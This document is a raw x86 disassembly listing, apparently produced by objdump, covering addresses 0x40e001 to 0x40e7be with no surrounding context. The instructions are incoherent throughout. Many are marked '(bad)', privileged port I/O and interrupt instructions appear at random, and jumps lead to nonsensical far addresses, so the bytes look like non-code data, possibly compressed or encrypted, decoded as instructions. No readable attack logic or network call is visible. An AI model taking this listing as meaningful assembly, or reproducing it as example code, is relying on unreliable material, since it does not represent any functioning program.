  40e001:	lock jns 0x40dfd3
  40e004:	xchg   edx,eax
  40e005:	and    ch,BYTE PTR [eax-0x23]
  40e008:	push   ss
  40e009:	mov    al,BYTE PTR [edx]
  40e00b:	push   es
  40e00c:	jnp    0x40e01a
  40e00e:	xchg   BYTE PTR [edi],ah
  40e010:	dec    ecx
  40e011:	repnz loop 0x40dffe
  40e014:	fs jbe 0x40e08a
  40e017:	aam    0x8e
  40e019:	mov    cl,0xe5
  40e01b:	fisub  WORD PTR cs:[edx-0x7e]
  40e01f:	sbb    bl,BYTE PTR [edi+0x790e31fb]
  40e025:	into   
  40e026:	pop    ebp
  40e027:	and    al,0x18
  40e029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e02a:	mov    ebx,0xeff17d69
  40e02f:	inc    ebx
  40e030:	push   0xbafbc78e
  40e035:	cmp    eax,0xffffffe0
  40e038:	fadd   st,st(3)
  40e03a:	or     ah,BYTE PTR ds:0x7e9836bb
  40e040:	pushf  
  40e041:	xchg   esi,eax
  40e042:	jae    0x40e027
  40e044:	adc    al,0xd
  40e046:	div    DWORD PTR [edx-0x1ddf1f57]
  40e04c:	mov    ebp,0x85049f9f
  40e051:	cmp    eax,0x74b458b8
  40e056:	cmp    al,0x3c
  40e058:	xchg   ebx,eax
  40e059:	js     0x40e0cf
  40e05b:	fsub   st,st(0)
  40e05d:	jmp    0x544fc5d5
  40e062:	and    edx,DWORD PTR es:[esi+0x72]
  40e066:	add    esp,ebp
  40e068:	push   cs
  40e069:	mov    DWORD PTR [ebx-0x23],ecx
  40e06c:	cmp    ebp,DWORD PTR [eax]
  40e06e:	inc    ecx
  40e06f:	adc    dh,BYTE PTR gs:[ebp+esi*2-0x60]
  40e074:	fcomi  st,st(2)
  40e076:	jmp    0x34fcc08c
  40e07b:	and    ch,BYTE PTR [edx+esi*2-0x34]
  40e07f:	ret    
  40e080:	jp     0x40e0d7
  40e082:	stos   BYTE PTR es:[edi],al
  40e083:	rep lods al,BYTE PTR ds:[esi]
  40e085:	xor    ch,bl
  40e087:	mov    edi,0xe6e7eb8e
  40e08c:	jg     0x40e104
  40e08e:	add    eax,0x2f1c1cd9
  40e093:	add    al,bh
  40e095:	dec    eax
  40e096:	pop    ds
  40e097:	aaa    
  40e098:	ins    BYTE PTR es:[edi],dx
  40e099:	xor    eax,0xb19fd461
  40e09e:	lea    esi,[ecx+0x27]
  40e0a1:	outs   dx,DWORD PTR ds:[esi]
  40e0a2:	sbb    al,0xee
  40e0a4:	(bad)  
  40e0a5:	stos   BYTE PTR es:[edi],al
  40e0a6:	sti    
  40e0a7:	mov    eax,esp
  40e0a9:	out    dx,eax
  40e0aa:	test   DWORD PTR [ecx+eax*2-0x27],0x5795a566
  40e0b2:	inc    eax
  40e0b3:	inc    DWORD PTR [ecx-0x47baedd3]
  40e0b9:	(bad)  
  40e0ba:	cli    
  40e0bb:	bound  esi,QWORD PTR [bp+si+0x7daa]
  40e0c0:	leave  
  40e0c1:	adc    ecx,edx
  40e0c3:	xor    dh,BYTE PTR [edi]
  40e0c5:	ds mov ch,0x44
  40e0c8:	addr16 repnz cmp esp,esp
  40e0cc:	lea    ebp,[edx+0x43ae6c3]
  40e0d2:	(bad)  [edx+0x5c]
  40e0d5:	aam    0xd
  40e0d7:	adc    DWORD PTR [esi+0xb],esp
  40e0da:	rcl    DWORD PTR [ebx],0x1a
  40e0dd:	pusha  
  40e0de:	jns    0x40e0d3
  40e0e0:	xchg   edx,eax
  40e0e1:	out    dx,eax
  40e0e2:	lock pop ebx
  40e0e4:	jae    0x40e071
  40e0e6:	inc    ebp
  40e0e7:	xchg   esi,eax
  40e0e8:	xchg   edx,eax
  40e0e9:	fiadd  WORD PTR [ebp+0x551b28d8]
  40e0ef:	push   ebx
  40e0f0:	and    esp,DWORD PTR [eax+ebx*2+0x5f]
  40e0f4:	retf   
  40e0f5:	sti    
  40e0f6:	xor    DWORD PTR [eax],eax
  40e0f8:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40e0fa:	inc    esi
  40e0fb:	xchg   edi,edx
  40e0fd:	enter  0xc310,0xd6
  40e101:	jl     0x40e129
  40e103:	jae    0x40e0bf
  40e105:	lahf   
  40e106:	leave  
  40e107:	(bad)  
  40e109:	pop    ecx
  40e10a:	xor    eax,0x2b5f323
  40e10f:	dec    edx
  40e110:	out    0x26,al
  40e112:	pop    eax
  40e113:	mov    ds:0x7658b4a9,al
  40e118:	ss pop ebp
  40e11a:	mov    ds:0x85152dff,al
  40e11f:	stos   DWORD PTR es:[edi],eax
  40e120:	aaa    
  40e121:	push   0xd3256d3e
  40e126:	cmc    
  40e127:	cmp    bl,BYTE PTR [esi-0x6a13f259]
  40e12d:	shr    bh,0xf8
  40e130:	addr16 sbb esp,eax
  40e133:	imul   ebx,DWORD PTR [esp+eiz*2+0x614ee2d1],0xf68e1a07
  40e13e:	push   edi
  40e13f:	push   eax
  40e140:	jae    0x40e108
  40e142:	or     DWORD PTR [edx],eax
  40e144:	cli    
  40e145:	pop    ebp
  40e146:	xchg   esi,eax
  40e147:	cmp    BYTE PTR [edi-0x6dd7226d],dh
  40e14d:	cmp    al,0xe2
  40e14f:	in     al,0xae
  40e151:	pop    esi
  40e152:	xchg   BYTE PTR [ebx],bh
  40e154:	sub    ecx,DWORD PTR [esi+0x26]
  40e157:	leave  
  40e158:	fwait
  40e159:	cmc    
  40e15a:	adc    cl,BYTE PTR [edx-0x2a]
  40e15d:	push   cs
  40e15e:	fild   WORD PTR [edi]
  40e160:	test   eax,0x3a594e62
  40e165:	stc    
  40e166:	xchg   edx,eax
  40e167:	(bad)  
  40e168:	hlt    
  40e169:	pop    ecx
  40e16a:	mov    al,ds:0x2fdd5d5a
  40e16f:	jb     0x40e17b
  40e171:	dec    esp
  40e172:	leave  
  40e173:	sub    eax,0xac245004
  40e178:	mov    WORD PTR [eax],es
	...
  40e1be:	add    BYTE PTR [edx-0x406b4a4f],bl
  40e1c4:	xchg   esp,eax
  40e1c5:	mov    ebx,0x5d8b00bf
  40e1ca:	sbb    ebp,DWORD PTR [esi-0x72]
  40e1cd:	fst    DWORD PTR [ecx]
  40e1cf:	mov    ds:0x220000e8,eax
  40e1d4:	pop    es
  40e1d5:	add    BYTE PTR [eax],al
  40e1d7:	jmp    0x2512764
  40e1dc:	aaa    
  40e1dd:	push   esi
  40e1de:	(bad)  
  40e1df:	out    0x32,eax
  40e1e1:	mov    al,ds:0x4ca19b4d
  40e1e6:	mov    bh,0x72
  40e1e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1e9:	xrstor [ecx-0x728e307d]
  40e1f0:	imul   ecx,DWORD PTR [ebp+0xf],0x45
  40e1f4:	mov    edx,0x8174f7a5
  40e1f9:	int    0x8b
  40e1fb:	inc    edx
  40e1fc:	in     al,0x96
  40e1fe:	cmp    esp,ecx
  40e200:	pop    esi
  40e201:	fst    DWORD PTR [ebx+0x65]
  40e204:	fwait
  40e205:	or     esp,DWORD PTR [ecx-0x4b]
  40e208:	sahf   
  40e209:	leave  
  40e20a:	inc    ebp
  40e20b:	cli    
  40e20c:	adc    eax,0x77f2f1a8
  40e211:	shr    DWORD PTR [eax+0x31],1
  40e214:	push   es
  40e215:	out    dx,al
  40e216:	imul   esi,DWORD PTR [ecx-0x76f103ab],0xd84a777e
  40e220:	out    0x51,eax
  40e222:	ss inc ebp
  40e224:	mov    eax,0xae383aee
  40e229:	or     al,0xcc
  40e22b:	dec    edi
  40e22c:	xchg   DWORD PTR fs:[ecx+ecx*8+0x70],esp
  40e231:	ss mov al,0x2b
  40e234:	xchg   edi,eax
  40e235:	pop    edx
  40e236:	and    BYTE PTR [edi],0x32
  40e239:	stos   DWORD PTR es:[edi],eax
  40e23a:	mov    ds,WORD PTR [ecx+0x49]
  40e23d:	mov    al,ds:0xf1becd26
  40e243:	test   al,0xa2
  40e245:	mov    eax,ds:0x6e51727c
  40e24a:	push   esi
  40e24b:	in     al,dx
  40e24c:	lds    edx,FWORD PTR [eax+0x6f]
  40e24f:	ret    
  40e250:	bound  ebx,QWORD PTR [ecx-0x5514469b]
  40e256:	push   esi
  40e257:	aad    0x12
  40e259:	enter  0xddb0,0xa1
  40e25d:	mov    ds:0x5a1b391d,eax
  40e262:	(bad)  
  40e263:	cmp    eax,0x7f2614d4
  40e268:	xor    BYTE PTR [edx+esi*1-0x5d],ah
  40e26c:	call   DWORD PTR [eax-0x59]
  40e26f:	sbb    al,0x37
  40e271:	into   
  40e272:	(bad)  
  40e273:	xchg   esi,eax
  40e274:	mov    edx,DWORD PTR [ebp+0x7]
  40e277:	test   BYTE PTR [ecx+0x7e8890c6],bh
  40e27d:	in     al,dx
  40e27e:	sbb    BYTE PTR [eax-0x25c3cf73],ch
  40e284:	mov    bh,0xaf
  40e286:	fisub  DWORD PTR [ecx-0x5a63c2fd]
  40e28c:	rcr    BYTE PTR [edi],0xc9
  40e28f:	popa   
  40e290:	and    bh,cl
  40e292:	cmp    al,0x9c
  40e294:	in     al,0x9a
  40e296:	ja     0x40e2c5
  40e298:	ret    0x58ce
  40e29b:	adc    DWORD PTR [eax+0x67],ebx
  40e29e:	ficomp DWORD PTR [edx+ebp*8-0x5d]
  40e2a2:	xlat   BYTE PTR ds:[ebx]
  40e2a3:	push   ecx
  40e2a4:	pusha  
  40e2a5:	scas   eax,DWORD PTR es:[edi]
  40e2a6:	cmp    ecx,DWORD PTR [edi-0x73bb335b]
  40e2ac:	or     eax,0x62c257b1
  40e2b1:	pushf  
  40e2b2:	sbb    BYTE PTR [ebx+0x16],ch
  40e2b5:	push   0xffffffe0
  40e2b7:	and    cl,dh
  40e2b9:	enter  0x54f3,0x98
  40e2bd:	xchg   BYTE PTR [ebp+0x5d],ah
  40e2c0:	(bad)  
  40e2c1:	mov    cl,0xe0
  40e2c3:	fidivr WORD PTR [ecx+esi*4]
  40e2c6:	shr    dh,1
  40e2c8:	pop    edi
  40e2c9:	inc    esp
  40e2ca:	xlat   BYTE PTR ds:[ebx]
  40e2cb:	inc    edx
  40e2cc:	stos   BYTE PTR es:[edi],al
  40e2cd:	pop    eax
  40e2ce:	lods   al,BYTE PTR ds:[esi]
  40e2cf:	inc    ecx
  40e2d0:	in     eax,0xdd
  40e2d2:	(bad)  
  40e2d3:	(bad)  
  40e2d4:	jbe    0x40e2ad
  40e2d6:	xlat   BYTE PTR ds:[ebx]
  40e2d7:	call   0xa2a5dc15
  40e2dc:	jne    0x40e345
  40e2de:	addr16 call 0xd73ca495
  40e2e4:	fist   WORD PTR [edx-0xf]
  40e2e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2e8:	pop    edi
  40e2e9:	pop    edi
  40e2ea:	mov    bh,0xb
  40e2ec:	dec    ebp
  40e2ed:	jno    0x40e2b4
  40e2ef:	in     al,0xff
  40e2f1:	cs mov ebp,0x34b14d1f
  40e2f7:	retf   
  40e2f8:	das    
  40e2f9:	dec    edi
  40e2fa:	xor    eax,0xbcb55cb9
  40e2ff:	add    BYTE PTR [ecx-0x75943d3b],0xdb
  40e306:	cs leave 
  40e308:	mov    ebp,0x48f958d9
  40e30d:	pop    ecx
  40e30e:	jp     0x40e339
  40e310:	imul   edx,DWORD PTR [edx-0x7d0e58cb],0xd6b12201
  40e31a:	test   eax,0x2d4675ec
  40e31f:	mov    dl,0x60
  40e321:	pop    ebx
  40e322:	data16 shl BYTE PTR [esi+0xb],cl
  40e326:	call   0xf6a:0xc017de55
  40e32d:	pop    eax
  40e32e:	push   0x8f089924
  40e333:	popf   
  40e334:	not    DWORD PTR [edi+0x43]
  40e337:	sub    ch,0x9e
  40e33a:	daa    
  40e33b:	dec    esi
  40e33c:	leave  
  40e33d:	sbb    DWORD PTR [ebx+0x55],ecx
  40e340:	jns    0x40e31b
  40e342:	push   ecx
  40e343:	cmp    eax,0x9124be7c
  40e348:	dec    ecx
  40e349:	and    al,0xfe
  40e34b:	ret    0x3f04
  40e34e:	xchg   ebx,eax
  40e34f:	add    bl,BYTE PTR [ebp+0x5c5e48bd]
  40e355:	test   BYTE PTR [ecx+0x163f0e99],bh
  40e35b:	aas    
  40e35c:	(bad)  
  40e35d:	aas    
  40e35e:	xchg   esi,eax
  40e35f:	jne    0x40e302
  40e361:	dec    edi
  40e362:	mov    ch,cl
  40e364:	std    
  40e365:	pop    es
  40e366:	adc    DWORD PTR [ecx],edi
  40e368:	push   edx
  40e369:	stos   BYTE PTR es:[edi],al
  40e36a:	mov    al,0xe6
  40e36c:	pushf  
  40e36d:	and    BYTE PTR [edx-0x2236d654],cl
  40e373:	(bad)  
  40e374:	mov    BYTE PTR [eax+0x45],cl
  40e377:	jne    0x40e389
  40e379:	mov    ebx,gs
  40e37b:	push   edx
  40e37c:	cld    
  40e37d:	or     al,dh
  40e37f:	and    al,0x47
  40e381:	xchg   BYTE PTR [eax-0x68],cl
  40e384:	(bad)  
  40e385:	jmp    DWORD PTR [ecx+0x6b]
  40e388:	int3   
  40e389:	(bad)  
  40e38a:	and    al,0x95
  40e38c:	jmp    0x40e3f5
  40e38e:	imul   ecx,DWORD PTR [ebx+0x66],0xfffffff6
  40e392:	pop    ebx
  40e393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e394:	mov    ecx,0x5e02fd35
  40e399:	int    0x1c
  40e39b:	push   0xffffff8d
  40e39d:	pushf  
  40e39e:	dec    ebx
  40e39f:	pop    ecx
  40e3a0:	in     eax,dx
  40e3a1:	mov    ch,0x8c
  40e3a3:	cwde   
  40e3a4:	pop    ss
  40e3a5:	aad    0xd6
  40e3a7:	cwde   
  40e3a8:	data16 or BYTE PTR [ecx],bh
  40e3ab:	jge    0x40e41e
  40e3ad:	dec    ebp
  40e3ae:	out    dx,al
  40e3af:	mov    ebx,0xe4c3c19d
  40e3b4:	mov    ch,0x42
  40e3b6:	mov    eax,0x7baed869
  40e3bb:	inc    esi
  40e3bc:	mov    bl,0xf3
  40e3be:	mov    al,ds:0xee97be56
  40e3c3:	jp     0x40e3ad
  40e3c5:	sbb    edi,DWORD PTR [ebx]
  40e3c7:	inc    esp
  40e3c8:	cdq    
  40e3c9:	sbb    al,0xb3
  40e3cb:	repnz cmp eax,0xac6656bd
  40e3d1:	shl    dh,cl
  40e3d3:	mov    bh,bl
  40e3d5:	(bad)  
  40e3d7:	inc    edi
  40e3d8:	jno    0x40e3db
  40e3da:	ficom  WORD PTR [ebp+0x42af0d96]
  40e3e0:	or     ecx,DWORD PTR [ebx-0x37585f21]
  40e3e6:	xchg   edx,eax
  40e3e7:	retf   0xb4da
  40e3ea:	inc    ecx
  40e3eb:	xor    esi,eax
  40e3ed:	jb     0x40e42d
  40e3ef:	lods   eax,DWORD PTR ds:[esi]
  40e3f0:	dec    edx
  40e3f1:	pop    ss
  40e3f2:	push   cs
  40e3f3:	add    ebx,edi
  40e3f5:	push   esi
  40e3f6:	sbb    DWORD PTR [edi+0x5a],edi
  40e3f9:	sub    eax,0x89c82749
  40e3fe:	or     ch,bl
  40e400:	fild   QWORD PTR [ecx+0x196c763b]
  40e406:	daa    
  40e407:	lds    edx,FWORD PTR [ebp+0x725e3c33]
  40e40d:	push   ss
  40e40e:	aad    0x3d
  40e410:	jle    0x40e3dc
  40e412:	dec    edx
  40e413:	movups xmm3,XMMWORD PTR [esi-0x46]
  40e417:	cmc    
  40e418:	lock push edi
  40e41a:	cmp    edi,DWORD PTR [ecx]
  40e41c:	pop    es
  40e41d:	fisub  WORD PTR [ebp+0x5d]
  40e420:	adc    DWORD PTR [edi+0x52],esi
  40e423:	sti    
  40e424:	jl     0x40e497
  40e426:	or     eax,0x2ec57b74
  40e42b:	xor    al,0x1b
  40e42d:	imul   edi,DWORD PTR [ecx],0x6d
  40e430:	inc    esi
  40e431:	cmc    
  40e432:	mov    ebp,0xc3aa798
  40e437:	add    BYTE PTR ds:0x7af06432,cl
  40e43d:	or     eax,0x847e5fd6
  40e442:	cmp    bl,BYTE PTR [ebp+0xe]
  40e445:	mov    al,ds:0x1cb34b21
  40e44a:	or     bl,BYTE PTR [ecx-0x6e001f32]
  40e450:	mov    eax,0xd7bc0448
  40e455:	test   BYTE PTR [esi-0x6f5dda8],0x5c
  40e45c:	fucomi st,st(0)
  40e45e:	xchg   esi,eax
  40e45f:	mov    ebx,edx
  40e461:	je     0x40e41d
  40e463:	xor    bl,bh
  40e465:	pop    ecx
  40e466:	pop    ebx
  40e467:	mov    al,0x51
  40e469:	mov    eax,0xe1f0ec77
  40e46e:	mov    cl,0x3b
  40e470:	cmp    DWORD PTR [edx-0x18],edx
  40e473:	out    0xd2,al
  40e475:	(bad)  
  40e476:	mov    eax,ds:0x8700ae1d
  40e47b:	loopne 0x40e470
  40e47d:	pop    es
  40e47e:	or     eax,0xce5d0867
  40e483:	stos   BYTE PTR es:[edi],al
  40e484:	push   ds
  40e485:	inc    eax
  40e486:	cld    
  40e487:	sub    eax,0xba1d2db8
  40e48c:	js     0x40e4a2
  40e48e:	(bad)  
  40e48f:	cmp    BYTE PTR [esi],cl
  40e491:	push   ds
  40e492:	popf   
  40e493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e494:	mov    al,0x75
  40e496:	push   0xd6a56f12
  40e49b:	(bad)  
  40e49c:	fdivrp st(4),st
  40e49e:	push   eax
  40e49f:	dec    esp
  40e4a0:	inc    ebp
  40e4a1:	inc    eax
  40e4a2:	pushf  
  40e4a3:	xchg   ebp,eax
  40e4a4:	mov    ebp,0x2b2e6f65
  40e4a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4aa:	ret    
  40e4ab:	sbb    esp,DWORD PTR [edx+esi*2]
  40e4ae:	pop    eax
  40e4af:	mov    bh,0x48
  40e4b1:	mov    edi,0x7b92622
  40e4b6:	pop    esi
  40e4b7:	or     BYTE PTR [ebx-0x24],bh
  40e4ba:	dec    esp
  40e4bb:	sbb    al,0xe4
  40e4bd:	push   ebp
  40e4be:	fdiv   DWORD PTR [ebx+0x4be10bfb]
  40e4c4:	dec    ebp
  40e4c5:	fcomp  QWORD PTR [esi-0x3b]
  40e4c8:	add    edx,DWORD PTR [eax+0x5b75115b]
  40e4ce:	mov    DWORD PTR [eax],ecx
  40e4d0:	gs retf 0xa2ab
  40e4d4:	mov    ah,0xbb
  40e4d6:	xchg   esi,eax
  40e4d7:	ficomp DWORD PTR gs:[ebp+0x17]
  40e4db:	xchg   esp,eax
  40e4dc:	and    al,0x7f
  40e4de:	mov    ds:0xea9ccc01,al
  40e4e3:	dec    eax
  40e4e4:	int    0x63
  40e4e6:	imul   edx,DWORD PTR [ebp+0x11],0xffc87665
  40e4ed:	cs nop
  40e4ef:	test   DWORD PTR [ebx],ebp
  40e4f1:	ret    
  40e4f2:	add    ebx,0x380c006b
  40e4f8:	adc    eax,0xeb8292ee
  40e4fd:	dec    esp
  40e4fe:	out    dx,al
  40e4ff:	mov    edi,0xcc7145f6
  40e504:	sbb    DWORD PTR [eax+0x62],ebp
  40e507:	jmp    0x710ffa43
  40e50c:	inc    DWORD PTR [ebx+0x53]
  40e50f:	pushf  
  40e510:	popa   
  40e511:	test   DWORD PTR ds:0xde9d9bfe,edx
  40e517:	add    al,BYTE PTR [ecx+edi*2-0x25]
  40e51b:	dec    esp
  40e51c:	scas   al,BYTE PTR es:[edi]
  40e51d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e51e:	aad    0x73
  40e520:	je     0x40e4b6
  40e522:	or     eax,DWORD PTR [ebp-0x1feec2ea]
  40e528:	push   esi
  40e529:	fisttp QWORD PTR [eax]
  40e52b:	jmp    0x1c5b:0xdab60ff5
  40e532:	sub    esp,ebx
  40e534:	das    
  40e535:	sub    dl,cl
  40e537:	jge    0x40e4fb
  40e539:	int    0x7f
  40e53b:	lods   al,BYTE PTR ds:[esi]
  40e53c:	mov    edi,0x5da8613e
  40e541:	fidiv  WORD PTR [ecx]
  40e543:	xchg   edx,eax
  40e544:	(bad)  
  40e545:	push   DWORD PTR [edx+0x3c]
  40e548:	mov    DWORD PTR ds:0x6238b7b7,edx
  40e54e:	mov    edx,0x6efbda81
  40e553:	retf   
  40e554:	fist   WORD PTR [ebx]
  40e556:	rcl    eax,1
  40e558:	fdiv   QWORD PTR [eax]
  40e55a:	and    DWORD PTR [ebx+0x653d7be6],esp
  40e560:	push   ebp
  40e561:	int    0x90
  40e563:	ins    DWORD PTR es:[edi],dx
  40e564:	add    ebx,DWORD PTR [eax+0xf]
  40e567:	outs   dx,BYTE PTR ds:[esi]
  40e568:	stos   DWORD PTR es:[edi],eax
  40e569:	ret    0xb9c4
  40e56c:	shl    DWORD PTR [ecx+0x80796e9],cl
  40e572:	add    eax,0xb30f4510
  40e577:	pop    esp
  40e578:	lock mov al,ds:0x83f9e2a0
  40e57e:	mov    ecx,0xa0f6f991
  40e583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e584:	pop    es
  40e585:	xchg   ebx,eax
  40e586:	mov    ds:0xd8b92f33,eax
  40e58b:	daa    
  40e58c:	push   edx
  40e58d:	adc    BYTE PTR [edi],0xf
  40e590:	in     eax,dx
  40e591:	xor    al,0x4
  40e593:	lock push 0xf91ef6cc
  40e599:	scas   eax,DWORD PTR es:[edi]
  40e59a:	out    0x36,eax
  40e59c:	ins    DWORD PTR es:[edi],dx
  40e59d:	rol    BYTE PTR [esi-0x2c183630],1
  40e5a3:	push   esp
  40e5a4:	and    al,0xbb
  40e5a6:	cmp    BYTE PTR [esi],0x7f
  40e5a9:	int    0x1b
  40e5ab:	out    dx,eax
  40e5ac:	gs and eax,0x26a525d4
  40e5b2:	add    DWORD PTR [edi+0x1e3beac4],0xeb784b0d
  40e5bc:	xchg   edi,eax
  40e5bd:	or     DWORD PTR [ebp-0x37ee7c5e],0x4015e26b
  40e5c7:	nop
  40e5c8:	ins    DWORD PTR es:[edi],dx
  40e5c9:	sbb    al,0x38
  40e5cb:	adc    edx,0xc997ad43
  40e5d1:	or     edx,ebx
  40e5d3:	test   BYTE PTR [ebp-0x39],bl
  40e5d6:	jecxz  0x40e56b
  40e5d8:	push   eax
  40e5d9:	int    0x8a
  40e5db:	or     eax,0x7cedba23
  40e5e0:	fisub  WORD PTR [esi]
  40e5e2:	(bad)  
  40e5e3:	jns    0x40e5a9
  40e5e5:	fild   QWORD PTR [ebp-0x1b]
  40e5e8:	retf   0x3380
  40e5eb:	cmp    esi,esp
  40e5ed:	add    al,0x9c
  40e5ef:	lea    edi,[ebx]
  40e5f1:	sbb    BYTE PTR [esp+ebx*8+0x1e],0x2c
  40e5f6:	das    
  40e5f7:	std    
  40e5f8:	daa    
  40e5f9:	or     eax,0x113162f
  40e5fe:	stc    
  40e5ff:	push   0xa403e70c
  40e604:	das    
  40e605:	fsub   DWORD PTR [ebp+0x51]
  40e608:	mov    edi,0xda5a3b45
  40e60d:	sub    eax,0xd4f4c4b5
  40e612:	pusha  
  40e613:	cmp    eax,0x615ebdbc
  40e618:	cmp    ah,BYTE PTR [ebx]
  40e61a:	mov    bh,0x19
  40e61c:	into   
  40e61d:	icebp  
  40e61e:	call   0xb62dc994
  40e623:	pop    ebp
  40e624:	sub    esi,DWORD PTR [edx+0x2b4a6e76]
  40e62a:	mov    DWORD PTR [ebx-0x6ba15f4c],edx
  40e630:	data16 cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40e633:	xor    ch,0xe4
  40e636:	and    al,0xed
  40e638:	jg     0x40e61a
  40e63a:	pop    ds
  40e63b:	pop    edi
  40e63c:	adc    dh,BYTE PTR [eax]
  40e63e:	repnz dec edi
  40e640:	(bad)  
  40e641:	popf   
  40e642:	retf   
  40e643:	out    0xdd,al
  40e645:	add    dh,0xd8
  40e648:	es ins BYTE PTR es:[edi],dx
  40e64a:	jo     0x40e695
  40e64c:	pop    esi
  40e64d:	xchg   edi,eax
  40e64e:	(bad)  
  40e64f:	pusha  
  40e650:	frstor [ebx+eiz*1+0xccf6774]
  40e657:	icebp  
  40e658:	cli    
  40e659:	push   eax
  40e65b:	out    0xea,al
  40e65d:	imul   eax,DWORD PTR [edx+0x369c5475],0x12
  40e664:	push   esp
  40e665:	fistp  DWORD PTR [eax+esi*1]
  40e668:	sar    BYTE PTR [ecx+ecx*1-0x21],cl
  40e66c:	sbb    dh,BYTE PTR [ebx+0x26661854]
  40e672:	push   ss
  40e673:	lea    ecx,[ebx]
  40e675:	mov    ah,0x90
  40e677:	or     DWORD PTR [ebx+eax*8],esi
  40e67a:	sub    DWORD PTR [ebp-0x53],edi
  40e67d:	scas   al,BYTE PTR es:[edi]
  40e67e:	in     eax,0x27
  40e680:	push   edx
  40e681:	mov    ch,0x4c
  40e683:	add    eax,DWORD PTR [ecx]
  40e685:	sub    BYTE PTR [ebx],ah
  40e687:	jns    0x40e6e9
  40e689:	pushf  
  40e68a:	sub    eax,DWORD PTR [ebx+0x19]
  40e68d:	and    BYTE PTR [ebp+0x48],cl
  40e690:	adc    al,BYTE PTR [ebx-0x450eba77]
  40e696:	outs   dx,BYTE PTR ds:[esi]
  40e697:	imul   esp,DWORD PTR [eax],0x69c9f90c
  40e69d:	push   esp
  40e69f:	mov    esp,0x9b596572
  40e6a4:	int    0x81
  40e6a6:	and    ch,bl
  40e6a8:	imul   esi,DWORD PTR [eax+0x4aa2fc2f],0x61
  40e6af:	xchg   DWORD PTR [eax-0x5e],esp
  40e6b2:	mov    eax,ds:0x339951fd
  40e6b7:	ret    
  40e6b8:	or     esi,DWORD PTR [esi]
  40e6ba:	lods   eax,DWORD PTR ds:[esi]
  40e6bb:	mov    esi,0x7cda3cfa
  40e6c0:	mov    esp,0x4e1c1940
  40e6c5:	lds    ebx,FWORD PTR [eax]
  40e6c7:	mov    ah,0xc2
  40e6c9:	or     BYTE PTR [edx-0x4],bl
  40e6cc:	xchg   BYTE PTR [eax],bh
  40e6ce:	test   al,0x65
  40e6d0:	sub    dl,ch
  40e6d2:	mov    ecx,0x7c87d0ea
  40e6d7:	mov    al,0xb4
  40e6d9:	test   BYTE PTR [edi],0x8
  40e6dc:	pop    ebx
  40e6dd:	arpl   WORD PTR [esi],sp
  40e6df:	inc    ecx
  40e6e0:	je     0x40e74b
  40e6e2:	in     eax,0x1a
  40e6e4:	and    al,0xbe
  40e6e6:	retf   
  40e6e7:	sub    esi,edx
  40e6e9:	jb     0x40e757
  40e6eb:	push   esi
  40e6ec:	loop   0x40e73f
  40e6ee:	pop    edi
  40e6ef:	add    eax,0x6373be25
  40e6f4:	mov    ah,0x41
  40e6f6:	pop    ss
  40e6f7:	add    BYTE PTR [ebx-0x7c8c3aeb],ah
  40e6fd:	test   al,0xbe
  40e6ff:	jne    0x40e6a7
  40e701:	lods   eax,DWORD PTR ds:[esi]
  40e702:	scas   al,BYTE PTR es:[edi]
  40e703:	hlt    
  40e704:	loopne 0x40e760
  40e706:	pop    ecx
  40e707:	mov    bl,0x7b
  40e709:	xchg   ebp,eax
  40e70a:	arpl   sp,cx
  40e70c:	pop    es
  40e70d:	cwde   
  40e70e:	cdq    
  40e70f:	mov    cl,0xe2
  40e711:	ds dec edx
  40e713:	dec    edi
  40e714:	pop    ecx
  40e715:	inc    ebp
  40e716:	int    0x81
  40e718:	cs xchg esp,eax
  40e71a:	mov    ebx,0xb8ed2881
  40e71f:	in     al,0xef
  40e721:	mov    esi,0x25291a46
  40e726:	jnp    0x40e6b5
  40e728:	and    bh,dh
  40e72a:	pusha  
  40e72b:	std    
  40e72c:	jmp    0x40e773
  40e72e:	repz push cs
  40e730:	test   eax,0x7ed73286
  40e735:	or     al,0x7f
  40e737:	jp     0x40e7a0
  40e739:	xor    al,0x72
  40e73b:	add    eax,0xc9432fff
  40e740:	sbb    dl,ch
  40e742:	sub    BYTE PTR [ebp-0x8],al
  40e745:	out    dx,al
  40e746:	test   dh,ah
  40e748:	xlat   BYTE PTR ds:[ebx]
  40e749:	jbe    0x40e718
  40e74b:	xchg   ah,ah
  40e74d:	jmp    0x40dd:0x751be78a
  40e754:	sub    al,0x13
  40e756:	popa   
  40e757:	pop    ss
  40e758:	jns    0x40e78d
  40e75a:	adc    BYTE PTR [esi-0x430df0fc],dl
  40e760:	outs   dx,DWORD PTR ds:[esi]
  40e761:	cmp    cl,BYTE PTR [edx]
  40e763:	in     eax,0x91
  40e765:	cmp    BYTE PTR [edx+0x57],0x7f
  40e769:	out    0xe5,eax
  40e76b:	sub    bh,cl
  40e76d:	jmp    0x40e75e
  40e76f:	pop    edx
  40e770:	fstp   QWORD PTR [ebp+edx*8+0x4bda9105]
  40e777:	inc    ebp
  40e778:	xor    al,0x3a
  40e77a:	and    DWORD PTR [ebx+0xf],edx
  40e77d:	mov    ah,0xff
  40e77f:	das    
  40e780:	jp     0x40e7d0
  40e782:	push   ss
  40e783:	sbb    al,BYTE PTR [edi+0x7b]
  40e786:	leave  
  40e787:	lds    ebx,FWORD PTR [esp+edx*4-0x3e0cd73a]
  40e78e:	jns    0x40e760
  40e790:	(bad)  
  40e792:	std    
  40e793:	adc    bl,BYTE PTR [edi]
  40e795:	loopne 0x40e7dc
  40e797:	xor    edi,DWORD PTR fs:[ecx-0x5ae3def0]
  40e79e:	xor    DWORD PTR [edi-0x3c796188],ecx
  40e7a4:	or     ax,0xfa68
  40e7a8:	shr    BYTE PTR [esi+0x7e47e877],0x7e
  40e7af:	mov    ecx,?
  40e7b1:	in     al,dx
  40e7b2:	or     ch,BYTE PTR [eax]
  40e7b4:	xlat   BYTE PTR ds:[ebx]
  40e7b5:	mov    dh,0x8f
  40e7b7:	jge    0x40e800
  40e7b9:	ds (bad) 
  40e7bb:	sub    al,0xda
  40e7bd:	pop    ds
  40e7be:	jno    0x40e7fe
